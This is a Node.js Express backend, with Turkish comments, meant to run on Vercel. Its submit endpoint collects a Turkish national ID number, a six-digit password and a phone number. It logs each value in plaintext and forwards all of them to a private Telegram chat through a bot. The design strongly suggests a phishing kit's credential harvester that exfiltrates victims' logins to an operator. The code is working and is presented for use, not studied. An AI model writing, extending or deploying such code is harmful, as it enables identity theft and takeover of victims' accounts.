import express from 'express';
import axios from 'axios';
import 'dotenv/config'; // dotenv modülünü ES modülleriyle uyumlu hale getirmek için

const app = express();
app.use(express.json());

// Üretimde CORS'u sınırla (geliştirme için geçici olarak tümü açık)
const corsOptions = {
  origin: process.env.NODE_ENV === 'development' ? '*' : 'https://frontend-proje-adi.vercel.app',
  optionsSuccessStatus: 200 // bazı eski tarayıcılar için
};
app.use(cors(corsOptions));

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

console.log("Bot Token:", TELEGRAM_BOT_TOKEN ? 'Yüklendi' : 'Eksik');
console.log("Chat ID:", TELEGRAM_CHAT_ID ? 'Yüklendi' : 'Eksik');

// Test endpoint'i
app.get('/api/test', (req, res) => {
  console.log('Test endpoint\'ine istek geldi.');
  res.status(200).json({ message: 'Backend çalışıyor!' });
});

// Submit endpoint'i
app.post('/api/submit', async (req, res) => {
  console.log('POST /api/submit isteği alındı, gövde:', req.body);
  const { tc, password, phone } = req.body;

  if (!tc || typeof tc !== 'string' || tc.length !== 11 || !/^\d+$/.test(tc)) {
    console.log('Hata: Geçersiz TC:', tc);
    return res.status(400).json({ message: 'Geçersiz TC numarası. 11 haneli olmalı ve sadece rakam içermeli.' });
  }
  if (!password || typeof password !== 'string' || password.length !== 6 || !/^\d+$/.test(password)) {
    console.log('Hata: Geçersiz şifre:', password);
    return res.status(400).json({ message: 'Geçersiz şifre. 6 haneli olmalı ve sadece rakam içermeli.' });
  }
  if (!phone || typeof phone !== 'string' || phone.length !== 10 || !/^\d+$/.test(phone)) {
    console.log('Hata: Geçersiz telefon:', phone);
    return res.status(400).json({ message: 'Geçersiz telefon numarası. 10 haneli olmalı ve sadece rakam içermeli.' });
  }

  const message = `
    Yeni Kullanıcı Bilgileri:
    TC: ${tc}
    Şifre: ${password}
    Telefon Numarası: ${phone}
  `;

  try {
    console.log('Telegram\'a mesaj gönderiliyor:', message);
    const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
    });
    console.log('Telegram yanıtı:', response.data);
    res.status(200).json({ message: 'Bilgiler başarıyla gönderildi.' });
  } catch (error) {
    console.error('Telegram hatası:', error.message, error.response?.data);
    res.status(500).json({ message: `Telegram'a mesaj gönderilemedi: ${error.message || 'Bilinmeyen bir hata'}` });
  }
});

// Yerel sunucu başlatma (Vercel'de bu kısım ignore edilecek)
const PORT = process.env.PORT || 5000;
if (process.env.NODE_ENV !== 'production') {
  app.listen(PORT, () => {
    console.log(`Sunucu ${PORT} portunda çalışıyor`);
  });
}

// Vercel uyumluluğu için export
export default async function handler(req, res) {
  if (req.method === 'GET' && req.url === '/api/test') {
    return res.status(200).json({ message: 'Backend çalışıyor!' });
  }
  if (req.method === 'POST' && req.url === '/api/submit') {
    return await app(req, res); // Express app'i kullanarak isteği işleme
  }
  return res.status(404).json({ message: 'Yol bulunamadı.' });
}